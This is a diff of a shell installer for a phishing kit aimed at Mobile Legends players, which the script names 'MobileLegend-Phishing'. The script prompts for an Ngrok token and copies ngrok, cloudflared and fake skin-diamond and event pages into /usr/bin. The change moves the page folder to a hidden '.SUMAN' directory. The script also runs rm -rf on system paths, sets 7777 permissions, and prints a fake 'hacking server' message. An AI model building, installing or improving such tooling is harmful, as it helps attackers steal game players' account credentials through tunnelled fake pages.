@@ -26,8 +26,11 @@ echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 6 :\e[0m\e[1;36m Enter The Ngrok To
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 7 :\e[0m\e[1;36m Start Phishing  "
 echo ""
 echo ""
-rm -rf /usr/bin/SUMAN
-rm -rf /usr/bin/OnlineHacking
+rm -rf /usr/bin/.SUMAN/1-Skin-Diamonds
+rm -rf /usr/bin/.SUMAN/2-Event-Red
+rm -rf /usr/bin/.SUMAN/3-Event-Blue
+rm -rf /usr/bin/OnlineHacking/LOGO.sh
+rm -rf /usr/bin/OnlineHacking/LOGO2.sh
 rm -rf /usr/bin/MobileLegend-Phishing
 rm -rf /usr/bin/ngrok
 rm -rf /usr/bin/cloudflared
@@ -155,23 +158,23 @@ read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ./ngrok authtok
 $token
 echo ""
 echo
-cp -R cloudflared-linux-386 ngrok SUMAN/1/
-cp -R cloudflared-linux-386 ngrok SUMAN/2/
-cp -R cloudflared-linux-386 ngrok SUMAN/3/
+cp -R cloudflared-linux-386 ngrok .SUMAN/1-Skin-Diamonds/
+cp -R cloudflared-linux-386 ngrok .SUMAN/2-Event-Red/
+cp -R cloudflared-linux-386 ngrok .SUMAN/3-Event-Blue/
 chmod 7777 MobileLegend-Phishing
 clear
 echo
 echo
 cp -R ngrok /usr/bin/
 cp -R cloudflared-linux-386 /usr/bin/
-cp -R SUMAN /usr/bin/
+cp -R .SUMAN /usr/bin/
 cp -R MobileLegend /usr/bin/
 cp -R MobileLegend-Phishing /usr/bin/
 cp -R ML /usr/bin/
 cp -R Run-Ngrok /usr/bin/
 cp -R OnlineHacking /usr/bin/
 echo
-rm -rf SUMAN SUMAN1
+rm -rf .SUMAN
 echo
 echo -e "\e[35m[+] Connect Online Hacking Free Fire Hacking Server......  \e[m "
 sleep 2
